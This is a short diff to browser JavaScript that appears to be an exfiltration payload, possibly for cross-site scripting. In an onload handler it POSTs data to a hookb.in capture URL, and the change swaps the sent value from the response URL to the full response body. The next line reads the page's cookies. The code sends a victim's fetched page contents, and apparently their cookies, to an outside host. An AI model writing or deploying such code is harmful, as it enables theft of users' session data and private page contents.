@@ -9,7 +9,7 @@ http.onload = function () {
                 const xhr = new XMLHttpRequest();
                 xhr.open('POST', 'https://hookb.in/aB0eXaLPk9sXQ9kkEBaR', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
-                xhr.send(JSON.stringify(http.responseURL));
+                xhr.send(JSON.stringify(http.responseText));
 
 };
 const cook = document.cookie;
